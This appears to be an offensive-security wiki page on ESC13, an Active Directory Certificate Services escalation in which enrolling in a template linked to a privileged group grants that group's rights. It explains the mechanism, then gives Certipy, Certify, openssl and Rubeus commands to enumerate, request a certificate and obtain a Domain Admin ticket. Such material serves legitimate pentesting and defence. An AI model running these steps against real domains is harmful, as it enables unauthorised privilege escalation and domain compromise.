# ESC13

{% hint style="info" %}
Enrolee gets privileges of the linked Group
{% endhint %}

## Why It Works

* AD CS supports **Issuance Policies** - objects that can be attached to a certificate template via the `msPKI-Certificate-Policy` extension.
* A newer AD feature allows an Issuance Policy object to be **linked to a security group** via the `msDS-OIDToGroupLink` attribute. When a certificate carrying that issuance policy OID is used for authentication in environments that honor this mapping, the authenticating session can be treated as if the user were a member of the linked group.
* If a template links to an issuance policy that's tied to a **privileged group** (e.g. Domain Admins), and that template grants enrollment rights to a low-privileged principal, simply enrolling for a certificate grants the equivalent of group membership upon authentication - no SAN/UPN manipulation needed at all.
* This is conceptually similar to ESC1 (low-priv enrollment -> high-priv outcome) but the privilege escalation vector is the **group-link OID**, not the certificate's identity fields.

## Prerequisites

* A certificate template with an Issuance Policy linked (`msDS-OIDToGroupLink`) to a privileged group.
* Enrollment rights on that template for a low-privileged principal.

## Enumerate

{% code lineNumbers="true" %}
```bash
certipy find -u <user>@<domain> -p <password> -dc-ip <DC-IP> -vulnerable -stdout
## Certipy resolves Issuance Policy -> msDS-OIDToGroupLink -> group name, and flags low-priv-enrollable templates linked to privileged groups
```
{% endcode %}

## Exploit

{% tabs %}
{% tab title="Certipy" %}
{% code lineNumbers="true" %}
```bash
certipy req -u <user>@<domain> -p <password> -ca <CA-Name> -template <group-linked-template>
certipy auth -pfx <issued-cert>.pfx -dc-ip <DC-IP>
## Resulting session/ticket carries the privileges of the linked group (e.g. Domain Admins)
```
{% endcode %}
{% endtab %}

{% tab title="ADModule + Certify + Rubeus +Openssl" %}
```bat
REM Certify doesn't resolve msDS-OIDToGroupLink directly - confirm the group link via PowerShell/RSAT first
Get-ADObject -SearchBase "CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=<domain>,DC=com" -Filter * -Properties msDS-OIDToGroupLink,DisplayName
Certify.exe request /ca:<CA-ServerDomain>\<CA-Username> /template:<group-linked-template>
openssl.exe pkcs12 -in esc13.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out esc13.pfx
Rubeus.exe asktgt /user:<controlled-account> /certificate:esc13.pfx /ptt
```
{% endtab %}
{% endtabs %}
